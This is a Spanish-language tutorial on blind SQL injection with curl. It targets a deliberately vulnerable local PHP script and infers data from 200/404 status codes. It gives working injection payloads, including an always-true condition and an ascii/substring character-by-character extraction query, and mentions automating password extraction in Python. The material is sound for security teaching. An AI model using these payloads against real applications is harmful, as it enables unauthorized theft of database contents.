# Uso de Curl para Inyecciones SQL a Ciegas

## Introducción

Este documento describe cómo utilizar `curl` para realizar [SQLi](SQLi.md) a ciegas, basándonos en los códigos de estado HTTP devueltos por el servidor. En un entorno real, este tipo de pruebas se llevarían a cabo sobre aplicaciones web vulnerables que no muestran directamente los resultados de las consultas [SQL](SQL.md), pero cuyos códigos de respuesta pueden revelar información útil.

El entorno de pruebas está basado en un servidor local con un script PHP vulnerable llamado `searchUsers.php`. Su funcionamiento es el siguiente:

1. **Conexión a la base de datos**: Se conecta a un servidor MySQL con las credenciales predefinidas.
2. **Recepción de parámetros**: Obtiene el valor de `id` a través de una solicitud GET.
3. **Falta de validación adecuada**: Usa `mysqli_real_escape_string` para sanitizar la entrada, pero **omite las comillas en la consulta SQL**, lo que permite inyecciones sin necesidad de cerrar la cadena con `'`.
4. **Consulta SQL vulnerable**: Ejecuta la consulta `SELECT username FROM users WHERE id = $id`, lo que permite inyectar condiciones SQL adicionales.
5. **Código de respuesta basado en los resultados**:
   - Si se encuentra un usuario con el `id` especificado, devuelve `HTTP/1.1 200 OK`.
   - Si no se encuentra un usuario, devuelve `HTTP/1.1 404 Not Found`.

Este comportamiento nos permite inferir información sobre la base de datos basándonos en los códigos de estado obtenidos tras enviar distintas consultas.

---

Para recoger información con **Curl**, podemos usar `-G --data-urlencode`, lo que nos permite realizar peticiones GET de manera más cómoda y organizada. En este caso, queremos emplearlo para realizar una inyección SQL a ciegas y observar los códigos de estado HTTP en las respuestas.

## Envío de Peticiones con Curl

El siguiente comando nos permite hacer una petición con un parámetro `id`:

```bash
curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=1"
```

Podemos modificar el valor de `id=N` para obtener diferentes respuestas y analizar el comportamiento de la aplicación.

Por ejemplo, si enviamos una consulta con una condición siempre verdadera:

```bash
curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=9 or 1=1"
```

Obtendremos un *código de estado 200*, porque `1=1` es una condición siempre verdadera y la consulta devuelve una respuesta válida, incluso si el identificador `id=9` no existe.

### Ejemplo de Respuestas del Servidor

#### Petición con un ID válido:
```bash
❯ curl -s -I -X GET 'http://localhost/searchUsers.php?id=1'
```
**Respuesta:**
```
HTTP/1.1 200 OK
Date: Sat, 29 Mar 2025 19:06:14 GMT
Server: Apache/2.4.62 (Debian)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

#### Petición con un ID inexistente:
```bash
❯ curl -s -I -X GET 'http://localhost/searchUsers.php?id=5'
```
**Respuesta:**
```
HTTP/1.1 404 Not Found
Date: Sat, 29 Mar 2025 19:06:19 GMT
Server: Apache/2.4.62 (Debian)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

## Inyección SQL Basada en Comparación ASCII

Podemos utilizar funciones como `ascii()` y `substring()` para extraer información carácter por carácter. Por ejemplo, si queremos verificar si el primer carácter del nombre de usuario (`username`) es 'a' (`97` en ASCII), enviamos:

```bash
curl -s -I -X GET 'http://localhost/searchUsers.php' -G --data-urlencode 'id=9 or (select(select ascii(substring(username,1,1)) from users where id = 1)=97)'
```

Si la respuesta es `200 OK`, significa que la condición es verdadera, lo que nos indica que el `username` en la posición `1,1` es 'a'.

## Automatización con Python

Este método nos permite desarrollar un **script en [Python](./Python)** que realice múltiples peticiones, probando diferentes valores y analizando las respuestas. De esta manera, podemos extraer datos como nombres de usuario o contraseñas de la base de datos basándonos en los códigos de respuesta HTTP.

---

Este procedimiento es clave para realizar una extracción eficiente en ataques **SQLi a ciegas**, permitiéndonos descubrir información sin ver directamente el resultado de las consultas. 
